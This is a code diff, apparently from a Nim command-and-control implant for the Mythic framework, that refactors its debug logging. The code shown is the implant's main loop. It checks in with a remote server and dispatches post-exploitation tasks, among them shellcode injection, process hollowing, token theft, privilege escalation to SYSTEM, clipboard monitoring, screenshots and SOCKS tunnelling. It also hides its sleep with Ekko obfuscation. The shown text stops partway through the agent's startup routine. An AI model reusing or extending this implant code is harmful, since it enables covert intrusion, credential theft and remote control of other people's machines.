@@ -6,6 +6,7 @@ import profiles/websocket_profile
 import profiles/httpx_profile
 import utils/sysinfo
 import utils/mythic_responses
+import utils/debug
 import tasks/exit
 import tasks/sleep
 import tasks/ls
@@ -153,8 +154,7 @@ proc newAgent*(): Agent =
   # Initialize global data storage
   initGlobalData()
   
-  if result.config.debug:
-    echo "[DEBUG] Agent: Initializing profile (", result.config.profile, ")..."
+  debug &"[DEBUG] Agent: Initializing profile ({result.config.profile})..."
   
   # Initialize the correct profile based on config
   case result.config.profile
@@ -165,8 +165,7 @@ proc newAgent*(): Agent =
   else:  # Default to HTTP for "http" or any other value
     result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
   
-  if result.config.debug:
-    echo "[DEBUG] Agent: Profile initialized successfully"
+  debug "[DEBUG] Agent: Profile initialized successfully"
   
   result.callbackUuid = result.config.uuid  # Initialize with payload UUID
   result.shouldExit = false
@@ -175,8 +174,7 @@ proc newAgent*(): Agent =
   result.taskResponses = @[]
   result.backgroundTasks = initTable[string, BackgroundTaskState]()
   
-  if result.config.debug:
-    echo "[DEBUG] Agent: Parsing AESPSK configuration..."
+  debug "[DEBUG] Agent: Parsing AESPSK configuration..."
   
   # If AESPSK is configured, parse and set it
   # Note: For RSA mode, AESPSK is used temporarily for staging_rsa, then replaced by session key
@@ -189,20 +187,16 @@ proc newAgent*(): Agent =
       let decoded = decode(encKeyB64)
       let keyBytes = cast[seq[byte]](decoded)
       result.profile.setAesKey(keyBytes)
-      if result.config.debug:
-        if result.config.encryptedExchange:
-          echo "[DEBUG] AESPSK loaded for RSA staging (will be replaced by session key after key exchange)"
-        else:
-          echo "[DEBUG] AESPSK detected - using pre-shared AES key (no RSA exchange)"
+      if result.config.encryptedExchange:
+        debug "[DEBUG] AESPSK loaded for RSA staging (will be replaced by session key after key exchange)"
+      else:
+        debug "[DEBUG] AESPSK detected - using pre-shared AES key (no RSA exchange)"
     except:
-      if result.config.debug:
-        echo "[DEBUG] Failed to parse AESPSK: ", getCurrentExceptionMsg()
+      debug "[DEBUG] Failed to parse AESPSK: " & getCurrentExceptionMsg()
   else:
-    if result.config.debug:
-      echo "[DEBUG] Agent: No AESPSK configured"
+    debug "[DEBUG] Agent: No AESPSK configured"
   
-  if result.config.debug:
-    echo "[DEBUG] Agent: Initialization complete"
+  debug "[DEBUG] Agent: Initialization complete"
 
 proc buildCheckinMessage(): JsonNode =
   ## Build the initial checkin message
@@ -227,37 +221,31 @@ proc buildCheckinMessage(): JsonNode =
   
 proc checkin*(agent: Agent): bool =
   ## Perform initial checkin with Mythic
-  if agent.config.debug:
-    echo "[DEBUG] Starting checkin..."
+  debug "[DEBUG] Starting checkin..."
   
   # Perform RSA key exchange if enabled (regardless of whether AESPSK is set)
   # AESPSK is used to encrypt the staging_rsa message, then replaced with session key
   if agent.config.encryptedExchange:
-    if agent.config.debug:
-      echo "[DEBUG] RSA key exchange enabled - performing key exchange..."
+    debug "[DEBUG] RSA key exchange enabled - performing key exchange..."
     let (success, newUuid) = agent.profile.performKeyExchange()
     if not success:
-      if agent.config.debug:
-        echo "[DEBUG] Key exchange failed"
+      debug "[DEBUG] Key exchange failed"
       return false
     # Update callback UUID if server provided one
     if newUuid.len > 0:
-      if agent.config.debug:
-        echo "[DEBUG] Updating callback UUID from ", agent.callbackUuid, " to ", newUuid
+      debug "[DEBUG] Updating callback UUID from " & agent.callbackUuid & " to " & newUuid
       agent.callbackUuid = newUuid
   
   # Build and send checkin
   let checkinMsg = buildCheckinMessage()
   let checkinStr = $checkinMsg
   
-  if agent.config.debug:
-    echo "[DEBUG] Checkin message: ", checkinStr
+  debug "[DEBUG] Checkin message: " & checkinStr
   
   let response = agent.profile.send(checkinStr, agent.callbackUuid)
   
   if response.len == 0:
-    if agent.config.debug:
-      echo "[DEBUG] Checkin failed - empty response"
+    debug "[DEBUG] Checkin failed - empty response"
     return false
   
   try:
@@ -265,13 +253,11 @@ proc checkin*(agent: Agent): bool =
     if respJson.hasKey("status") and respJson["status"].getStr() == "success":
       # Update callback UUID from server response
       let newCallbackUuid = respJson["id"].getStr()
-      if agent.config.debug:
-        echo "[DEBUG] Checkin successful, updating callback UUID from ", agent.callbackUuid, " to ", newCallbackUuid
+      debug "[DEBUG] Checkin successful, updating callback UUID from " & agent.callbackUuid & " to " & newCallbackUuid
       agent.callbackUuid = newCallbackUuid
       return true
   except:
-    if agent.config.debug:
-      echo "[DEBUG] Failed to parse checkin response: ", getCurrentExceptionMsg()
+    debug "[DEBUG] Failed to parse checkin response: " & getCurrentExceptionMsg()
   
   return false
 
@@ -298,28 +284,23 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
     
     if respJson.hasKey("tasks"):
       tasks = respJson["tasks"].getElems()
-      if agent.config.debug:
-        echo "[DEBUG] Received ", tasks.len, " task(s)"
+      debug "[DEBUG] Received " & $tasks.len & " task(s)"
     
     if respJson.hasKey("interactive"):
       interactive = respJson["interactive"].getElems()
-      if agent.config.debug:
-        echo "[DEBUG] Received ", interactive.len, " interactive message(s)"
+      debug "[DEBUG] Received " & $interactive.len & " interactive message(s)"
     
     if respJson.hasKey("socks"):
       socks = respJson["socks"].getElems()
-      if agent.config.debug:
-        echo "[DEBUG] Received ", socks.len, " socks message(s)"
+      debug "[DEBUG] Received " & $socks.len & " socks message(s)"
     
     if respJson.hasKey("rpfwd"):
       rpfwd = respJson["rpfwd"].getElems()
-      if agent.config.debug:
-        echo "[DEBUG] Received ", rpfwd.len, " rpfwd message(s)"
+      debug "[DEBUG] Received " & $rpfwd.len & " rpfwd message(s)"
     
     return (tasks, interactive, socks, rpfwd)
   except:
-    if agent.config.debug:
-      echo "[DEBUG] Failed to parse tasking: ", getCurrentExceptionMsg()
+    debug "[DEBUG] Failed to parse tasking: " & getCurrentExceptionMsg()
     return (@[], @[], @[], @[])
 
 
@@ -328,8 +309,7 @@ proc processInteractive*(agent: var Agent, interactive: seq[JsonNode]) =
   ## Process interactive messages (PTY input from Mythic)
   for msg in interactive:
     let taskId = msg["task_id"].getStr()
-    if agent.config.debug:
-      echo "[DEBUG] Processing interactive message for task ", taskId
+    debug "[DEBUG] Processing interactive message for task " & taskId
     
     # Create array with single message for handler
     let response = handlePtyInteractive(taskId, @[msg])
@@ -339,8 +319,7 @@ proc processInteractive*(agent: var Agent, interactive: seq[JsonNode]) =
 proc processSocks*(agent: var Agent, socksMessages: seq[JsonNode]) =
   ## Process SOCKS messages (data forwarding from Mythic)
   if socksMessages.len > 0:
-    if agent.config.debug:
-      echo "[DEBUG] Processing ", socksMessages.len, " SOCKS message(s)"
+    debug "[DEBUG] Processing " & $socksMessages.len & " SOCKS message(s)"
     
     # Handle all SOCKS messages and get responses to send back
     let responses = handleSocksMessages(socksMessages)
@@ -351,8 +330,7 @@ proc processSocks*(agent: var Agent, socksMessages: seq[JsonNode]) =
 proc processRpfwd*(agent: var Agent, rpfwdMessages: seq[JsonNode]) =
   ## Process RPfwd messages (data forwarding from Mythic)
   if rpfwdMessages.len > 0:
-    if agent.config.debug:
-      echo "[DEBUG] Processing ", rpfwdMessages.len, " rpfwd message(s)"
+    debug "[DEBUG] Processing " & $rpfwdMessages.len & " rpfwd message(s)"
     
     # Handle all RPfwd messages and get responses to send back
     let responses = handleRpfwdMessages(rpfwdMessages)
@@ -369,8 +347,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
     # Check if this is a background task response (download/upload continuation)
     # These are forwarded to background threads in postResponses(), so skip here
     if command == "background_task":
-      if agent.config.debug:
-        echo "[DEBUG] Background task message (will be forwarded in postResponses): ", taskId
+      debug "[DEBUG] Background task message (will be forwarded in postResponses): " & taskId
       continue
     
     # Parse parameters - Mythic sends it as a JSON string
@@ -381,17 +358,15 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
         try:
           params = parseJson(paramStr)
         except:
-          if agent.config.debug:
-            echo "[DEBUG] Failed to parse parameters: ", paramStr
+          debug "[DEBUG] Failed to parse parameters: " & paramStr
     
-    if agent.config.debug:
-      echo "[DEBUG] === PROCESSING TASK ==="
-      echo "[DEBUG] Task ID: ", taskId
-      echo "[DEBUG] Command: ", command
-      if params.len > 0:
-        echo "[DEBUG] Parameters: ", params.pretty()
-      else:
-        echo "[DEBUG] No parameters"
+    debug "[DEBUG] === PROCESSING TASK ==="
+    debug "[DEBUG] Task ID: " & taskId
+    debug "[DEBUG] Command: " & command
+    if params.len > 0:
+      debug "[DEBUG] Parameters: " & params.pretty()
+    else:
+      debug "[DEBUG] No parameters"
     
     # Execute command and get response
     var response = %*{
@@ -404,21 +379,18 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
     try:
       case command
       of "exit":
-        if agent.config.debug:
-          echo "[DEBUG] Executing exit command"
+        debug "[DEBUG] Executing exit command"
         response = executeExit(params)
         response["task_id"] = %taskId
         agent.shouldExit = true
         
       of "sleep":
-        if agent.config.debug:
-          echo "[DEBUG] Executing sleep command"
+        debug "[DEBUG] Executing sleep command"
         response = executeSleep(params, agent.sleepInterval, agent.jitter)
         response["task_id"] = %taskId
         
       of "ls":
-        if agent.config.debug:
-          echo "[DEBUG] Executing ls command"
+        debug "[DEBUG] Executing ls command"
         let lsResult = executeLs(params)
         # ls returns file browser format, need to wrap for task response
         if lsResult.hasKey("files"):
@@ -431,18 +403,15 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
             "file_browser": lsResult,
             "user_output": $lsResult  # Also include as serialized JSON string
           }
-          if agent.config.debug:
-            echo "[DEBUG] Ls found ", lsResult["files"].len, " files"
+          debug "[DEBUG] Ls found " & $lsResult["files"].len & " files"
         else:
           # This is an error response, already has user_output
           response = lsResult
           response["task_id"] = %taskId
-          if agent.config.debug:
-            echo "[DEBUG] Ls returned error: ", lsResult.getOrDefault("user_output")
+          debug "[DEBUG] Ls returned error: " & response["user_output"].getStr()
       
       of "download":
-        if agent.config.debug:
-          echo "[DEBUG] Starting download"
+        debug "[DEBUG] Starting download"
         response = executeDownload(taskId, params)
         agent.taskResponses.add(response)
         
@@ -458,8 +427,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
         continue
       
       of "upload":
-        if agent.config.debug:
-          echo "[DEBUG] Starting upload"
+        debug "[DEBUG] Starting upload"
         response = executeUpload(taskId, params)
         agent.taskResponses.add(response)
         
@@ -482,8 +450,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "execute_assembly":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Starting execute-assembly (file download)"
+          debug "[DEBUG] Starting execute-assembly (file download)"
           response = executeAssembly(taskId, params)
           agent.taskResponses.add(response)
           
@@ -509,8 +476,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "inline_execute":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Starting inline_execute (BOF download)"
+          debug "[DEBUG] Starting inline_execute (BOF download)"
           response = inlineExecute(taskId, params)
           agent.taskResponses.add(response)
           
@@ -536,8 +502,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "powerpick":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing powerpick command"
+          debug "[DEBUG] Executing powerpick command"
           response = powerpick(taskId, params)
           response["task_id"] = %taskId
         else:
@@ -549,21 +514,18 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           }
       
       of "run":
-        if agent.config.debug:
-          echo "[DEBUG] Executing run command"
+        debug "[DEBUG] Executing run command"
         response = run(taskId, params)
         response["task_id"] = %taskId
       
       of "shell":
-        if agent.config.debug:
-          echo "[DEBUG] Executing shell command (alias for run)"
+        debug "[DEBUG] Executing shell command (alias for run)"
         response = run(taskId, params)
         response["task_id"] = %taskId
       
       of "shinject":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Starting shinject (shellcode download)"
+          debug "[DEBUG] Starting shinject (shellcode download)"
           response = shinject(taskId, params)
           agent.taskResponses.add(response)
           
@@ -588,54 +550,44 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           }
       
       of "whoami":
-        if agent.config.debug:
-          echo "[DEBUG] Executing whoami command"
+        debug "[DEBUG] Executing whoami command"
         response = whoami(taskId, $params)
       
       of "cat":
-        if agent.config.debug:
-          echo "[DEBUG] Executing cat command"
+        debug "[DEBUG] Executing cat command"
         response = catFile(taskId, $params)
       
       of "mkdir":
-        if agent.config.debug:
-          echo "[DEBUG] Executing mkdir command"
+        debug "[DEBUG] Executing mkdir command"
         response = makeDirectory(taskId, $params)
       
       of "cp":
-        if agent.config.debug:
-          echo "[DEBUG] Executing cp command"
+        debug "[DEBUG] Executing cp command"
         response = cpFile(taskId, $params)
       
       of "mv":
-        if agent.config.debug:
-          echo "[DEBUG] Executing mv command"
+        debug "[DEBUG] Executing mv command"
         response = mvFile(taskId, $params)
       
       of "cd":
-        if agent.config.debug:
-          echo "[DEBUG] Executing cd command"
+        debug "[DEBUG] Executing cd command"
         response = changeDirectory(taskId, $params)
       
       of "ps":
-        if agent.config.debug:
-          echo "[DEBUG] Executing ps command"
+        debug "[DEBUG] Executing ps command"
         response = ps($params)
         response["task_id"] = %taskId
       
       of "pwd":
-        if agent.config.debug:
-          echo "[DEBUG] Executing pwd command"
+        debug "[DEBUG] Executing pwd command"
         response = pwd(taskId, params)
       
       of "rm":
-        if agent.config.debug:
-          echo "[DEBUG] Executing rm command"
+        debug "[DEBUG] Executing rm command"
         response = rm(taskId, params)
       
       of "pty":
-        if agent.config.debug:
-          echo "[DEBUG] Executing pty command"
+        debug "[DEBUG] Executing pty command"
         response = pty(taskId, params)
         # PTY sessions don't complete immediately
         if response.hasKey("status") and response["status"].getStr() == "processing":
@@ -644,8 +596,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "make_token":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing make_token command"
+          debug "[DEBUG] Executing make_token command"
           response = makeToken(taskId, params)
         else:
           response = %*{
@@ -657,8 +608,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "steal_token":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing steal_token command"
+          debug "[DEBUG] Executing steal_token command"
           response = stealToken(taskId, params)
         else:
           response = %*{
@@ -670,8 +620,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "rev2self":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing rev2self command"
+          debug "[DEBUG] Executing rev2self command"
           response = rev2self(taskId, params)
         else:
           response = %*{
@@ -683,8 +632,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "runas":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing runas command"
+          debug "[DEBUG] Executing runas command"
           response = runas(taskId, params)
         else:
           response = %*{
@@ -696,8 +644,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "getsystem":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing getsystem command"
+          debug "[DEBUG] Executing getsystem command"
           response = getsystem(taskId, params)
         else:
           response = %*{
@@ -709,8 +656,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "getprivs":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing getprivs command"
+          debug "[DEBUG] Executing getprivs command"
           response = getprivs(taskId, params)
         else:
           response = %*{
@@ -721,14 +667,12 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           }
       
       of "getenv":
-        if agent.config.debug:
-          echo "[DEBUG] Executing getenv command"
+        debug "[DEBUG] Executing getenv command"
         response = taskGetenv.getenv(taskId, params)
       
       of "listpipes":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing listpipes command"
+          debug "[DEBUG] Executing listpipes command"
           response = listpipes(taskId, params)
         else:
           response = %*{
@@ -739,109 +683,94 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           }
       
       of "ifconfig":
-        if agent.config.debug:
-          echo "[DEBUG] Executing ifconfig command"
+        debug "[DEBUG] Executing ifconfig command"
         response = ifconfig(taskId, params)
       
       of "netstat":
-        if agent.config.debug:
-          echo "[DEBUG] Executing netstat command"
+        debug "[DEBUG] Executing netstat command"
         response = netstat(taskId, params)
       
       of "scshell":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing scshell command"
+          debug "[DEBUG] Executing scshell command"
           response = scshell(taskId, params)
         else:
           response = mythicError(taskId, "scshell is only available on Windows")
       
       of "config":
-        if agent.config.debug:
-          echo "[DEBUG] Executing config command"
+        debug "[DEBUG] Executing config command"
         response = taskConfig.config(taskId, params)
       
       of "pkill":
-        if agent.config.debug:
-          echo "[DEBUG] Executing pkill command"
+        debug "[DEBUG] Executing pkill command"
         response = pkill(taskId, params)
       
       of "spawnto_x64":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing spawnto_x64 command"
+          debug "[DEBUG] Executing spawnto_x64 command"
           response = spawnto_x64(taskId, params)
         else:
           response = mythicError(taskId, "spawnto_x64 is only available on Windows")
       
       of "spawnto_x86":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing spawnto_x86 command"
+          debug "[DEBUG] Executing spawnto_x86 command"
           response = spawnto_x86(taskId, params)
         else:
           response = mythicError(taskId, "spawnto_x86 is only available on Windows")
       
       of "ppid":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing ppid command"
+          debug "[DEBUG] Executing ppid command"
           response = ppid(taskId, params)
         else:
           response = mythicError(taskId, "ppid is only available on Windows")
       
       of "reg_query":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing reg_query command"
+          debug "[DEBUG] Executing reg_query command"
           response = regQuery(taskId, params)
         else:
           response = mythicError(taskId, "reg_query is only available on Windows")
       
       of "reg_write_value":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing reg_write_value command"
+          debug "[DEBUG] Executing reg_write_value command"
           response = regWriteValue(taskId, params)
         else:
           response = mythicError(taskId, "reg_write_value is only available on Windows")
       
       of "net_dclist":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing net_dclist command"
+          debug "[DEBUG] Executing net_dclist command"
           response = netDclist(taskId, params)
         else:
           response = mythicError(taskId, "net_dclist is only available on Windows")
       
       of "net_localgroup":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing net_localgroup command"
+          debug "[DEBUG] Executing net_localgroup command"
           response = netLocalgroup(taskId, params)
         else:
           response = mythicError(taskId, "net_localgroup is only available on Windows")
       
       of "net_localgroup_member":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing net_localgroup_member command"
+          debug "[DEBUG] Executing net_localgroup_member command"
           response = netLocalgroupMember(taskId, params)
         else:
           response = mythicError(taskId, "net_localgroup_member is only available on Windows")
       
       of "net_shares":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing net_shares command"
+          debug "[DEBUG] Executing net_shares command"
           response = netShares(taskId, params)
         else:
           response = mythicError(taskId, "net_shares is only available on Windows")
       
       of "get_av":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing get_av command"
+          debug "[DEBUG] Executing get_av command"
           response = getAv(taskId, params)
         else:
           response = %*{
@@ -853,8 +782,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "screenshot":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Starting screenshot capture"
+          debug "[DEBUG] Starting screenshot capture"
           response = screenshot(taskId, params)
           if response.hasKey("download"):
             # This is a background task - store screenshot data for chunking
@@ -887,8 +815,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           }
       
       of "socks":
-        if agent.config.debug:
-          echo "[DEBUG] Executing socks command"
+        debug "[DEBUG] Executing socks command"
         response = socks(taskId, params)
         # SOCKS sessions don't complete immediately
         if response.hasKey("status") and response["status"].getStr() == "processing":
@@ -896,8 +823,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           continue
       
       of "rpfwd":
-        if agent.config.debug:
-          echo "[DEBUG] Executing rpfwd command"
+        debug "[DEBUG] Executing rpfwd command"
         response = rpfwd(taskId, params)
         # RPfwd sessions don't complete immediately
         if response.hasKey("status") and response["status"].getStr() == "processing":
@@ -905,14 +831,12 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           continue
       
       of "redirect":
-        if agent.config.debug:
-          echo "[DEBUG] Executing redirect command"
+        debug "[DEBUG] Executing redirect command"
         response = redirect(taskId, params)
         # Redirect completes immediately (runs entirely in background threads)
       
       of "portscan":
-        if agent.config.debug:
-          echo "[DEBUG] Starting portscan (background task)"
+        debug "[DEBUG] Starting portscan (background task)"
         response = portscan(taskId, params)
         # Track as background task if processing
         if response.hasKey("status") and response["status"].getStr() == "processing":
@@ -922,8 +846,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "clipboard":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Executing clipboard command"
+          debug "[DEBUG] Executing clipboard command"
           response = clipboard(taskId, params)
         else:
           response = %*{
@@ -935,8 +858,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "clipboard_monitor":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Starting clipboard_monitor (background task)"
+          debug "[DEBUG] Starting clipboard_monitor (background task)"
           response = clipboardMonitor(taskId, params)
           # Track as background task if processing
           if response.hasKey("status") and response["status"].getStr() == "processing":
@@ -953,8 +875,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "donut":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Starting donut execution"
+          debug "[DEBUG] Starting donut execution"
           response = donut(taskId, params)
           agent.taskResponses.add(response)
           
@@ -980,8 +901,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       of "inject_hollow":
         when defined(windows):
-          if agent.config.debug:
-            echo "[DEBUG] Starting inject_hollow"
+          debug "[DEBUG] Starting inject_hollow"
           response = injectHollow(taskId, params)
           agent.taskResponses.add(response)
           
@@ -1007,12 +927,10 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       else:
         # Command not implemented
-        if agent.config.debug:
-          echo "[DEBUG] Command not implemented: ", command
+        debug "[DEBUG] Command not implemented: " & command
     
     except Exception as e:
-      if agent.config.debug:
-        echo "[DEBUG] Task execution error: ", e.msg
+      debug "[DEBUG] Task execution error: " & e.msg
       response = %*{
         "task_id": taskId,
         "user_output": "Error executing command: " & e.msg,
@@ -1020,15 +938,14 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
         "status": "error"
       }
     
-    if agent.config.debug:
-      if response.hasKey("status"):
-        echo "[DEBUG] Task result status: ", response["status"].getStr()
-      if response.hasKey("user_output"):
-        let output = response["user_output"].getStr()
-        if output.len < 200:
-          echo "[DEBUG] Task output: ", output
-        else:
-          echo "[DEBUG] Task output length: ", output.len, " bytes (first 100 chars): ", output[0..<min(100, output.len)]
+    if response.hasKey("status"):
+      debug "[DEBUG] Task result status: ", response["status"].getStr()
+    if response.hasKey("user_output"):
+      let output = response["user_output"].getStr()
+      if output.len < 200:
+        debug "[DEBUG] Task output: ", output
+      else:
+        debug "[DEBUG] Task output length: ", output.len, " bytes (first 100 chars): ", output[0..<min(100, output.len)]
     
     agent.taskResponses.add(response)
 
@@ -1062,9 +979,8 @@ proc postResponses*(agent: var Agent) =
   if agent.taskResponses.len == 0:
     return
   
-  if agent.config.debug:
-    echo "[DEBUG] === POSTING RESPONSES ==="
-    echo "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
+  debug "[DEBUG] === POSTING RESPONSES ==="
+  debug "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
   
   # Separate interactive, socks, and rpfwd messages from regular responses
   var regularResponses: seq[JsonNode] = @[]
@@ -1121,8 +1037,7 @@ proc postResponses*(agent: var Agent) =
   
   let response = agent.profile.send($postMsg, agent.callbackUuid)
   
-  if agent.config.debug:
-    echo "[DEBUG] Responses posted successfully"
+  debug "[DEBUG] Responses posted successfully"
   
   agent.taskResponses = @[]
   
@@ -1144,8 +1059,7 @@ proc postResponses*(agent: var Agent) =
               if state.fileId.len == 0 and taskResp.hasKey("file_id"):
                 state.fileId = taskResp["file_id"].getStr()
                 agent.backgroundTasks[taskId] = state
-                if agent.config.debug:
-                  echo "[DEBUG] Download got file_id: ", state.fileId
+                debug "[DEBUG] Download got file_id: ", state.fileId
               
               # Send next chunk
               if state.currentChunk < state.totalChunks:
@@ -1179,9 +1093,7 @@ proc postResponses*(agent: var Agent) =
                   
                   agent.taskResponses.add(completeMsg)
                   agent.backgroundTasks.del(taskId)
-                  if agent.config.debug:
-                    let taskType = if state.fileData.len > 0: "Screenshot" else: "Download"
-                    echo "[DEBUG] ", taskType, " complete"
+                  debug "[DEBUG] ", (if state.fileData.len > 0: "Screenshot" else: "Download"), " complete"
                 else:
                   agent.backgroundTasks[taskId] = state
             
@@ -1199,8 +1111,7 @@ proc postResponses*(agent: var Agent) =
                 
                 if uploadResp.hasKey("completed") and uploadResp["completed"].getBool():
                   agent.backgroundTasks.del(taskId)
-                  if agent.config.debug:
-                    echo "[DEBUG] Upload complete"
+                  debug "[DEBUG] Upload complete"
                 else:
                   state.currentChunk += 1
                   agent.backgroundTasks[taskId] = state
@@ -1222,8 +1133,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if execResp.hasKey("completed") and execResp["completed"].getBool():
                     agent.backgroundTasks.del(taskId)
-                    if agent.config.debug:
-                      echo "[DEBUG] Execute-assembly complete"
+                    debug "[DEBUG] Execute-assembly complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1245,8 +1155,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if bofResp.hasKey("completed") and bofResp["completed"].getBool():
                     agent.backgroundTasks.del(taskId)
-                    if agent.config.debug:
-                      echo "[DEBUG] Inline_execute complete"
+                    debug "[DEBUG] Inline_execute complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1268,8 +1177,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if injectResp.hasKey("completed") and injectResp["completed"].getBool():
                     agent.backgroundTasks.del(taskId)
-                    if agent.config.debug:
-                      echo "[DEBUG] Shinject complete"
+                    debug "[DEBUG] Shinject complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1291,8 +1199,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if donutResp.hasKey("completed") and donutResp["completed"].getBool():
                     agent.backgroundTasks.del(taskId)
-                    if agent.config.debug:
-                      echo "[DEBUG] Donut complete"
+                    debug "[DEBUG] Donut complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1314,14 +1221,12 @@ proc postResponses*(agent: var Agent) =
                   
                   if injectResp.hasKey("completed") and injectResp["completed"].getBool():
                     agent.backgroundTasks.del(taskId)
-                    if agent.config.debug:
-                      echo "[DEBUG] Inject hollow complete"
+                    debug "[DEBUG] Inject hollow complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
     except:
-      if agent.config.debug:
-        echo "[DEBUG] Failed to parse post_response reply: ", getCurrentExceptionMsg()
+      debug "[DEBUG] Failed to parse post_response reply: ", getCurrentExceptionMsg()
 
 proc calculateSleepTime(baseInterval: int, jitterPercent: int): int =
   ## Calculate sleep time with jitter
@@ -1343,20 +1248,17 @@ proc sleep*(agent: Agent) =
   ## Sleep with jitter
   let sleepTime = calculateSleepTime(agent.sleepInterval, agent.jitter)
   
-  if agent.config.debug:
-    echo "[DEBUG] Sleeping for ", sleepTime, " seconds (base: ", agent.sleepInterval, 
+  debug "[DEBUG] Sleeping for ", sleepTime, " seconds (base: ", agent.sleepInterval, 
          "s, jitter: ", agent.jitter, "%)"
   
   # Use Ekko sleep obfuscation if enabled (only for sleeps > 2 seconds)
   when defined(windows):
     when defined(sleepObfuscationEkko):
       if sleepTime > 2:
-        if agent.config.debug:
-          echo "[DEBUG] Using Ekko sleep obfuscation"
+        debug "[DEBUG] Using Ekko sleep obfuscation"
         ekkoObf(sleepTime * 1000)
       else:
-        if agent.config.debug:
-          echo "[DEBUG] Sleep time < 3s, using regular sleep instead of Ekko"
+        debug "[DEBUG] Sleep time < 3s, using regular sleep instead of Ekko"
         os.sleep(sleepTime * 1000)
     else:
       os.sleep(sleepTime * 1000)
@@ -1369,39 +1271,32 @@ proc runAgent*() =
   
   let cfg = getConfig()
   
-  if cfg.debug:
-    echo "[DEBUG] runAgent: Starting agent initialization..."
+  debug "[DEBUG] runAgent: Starting agent initialization..."
   
   # Initialize random number generator for jitter
   randomize()
   
-  if cfg.debug:
-    echo "[DEBUG] runAgent: Random seed initialized"
+  debug "[DEBUG] runAgent: Random seed initialized"
   
   # Check killdate
   let now = now().format("yyyy-MM-dd")
   if now >= cfg.killdate:
-    if cfg.debug:
-      echo "[DEBUG] runAgent: Killdate reached, exiting"
+    debug "[DEBUG] runAgent: Killdate reached, exiting"
     return
   
-  if cfg.debug:
-    echo "[DEBUG] runAgent: Creating agent instance..."
+  debug "[DEBUG] runAgent: Creating agent instance..."
   
   # Initialize agent
   var agentInstance = newAgent()
   
-  if cfg.debug:
-    echo "[DEBUG] runAgent: Agent instance created, starting checkin..."
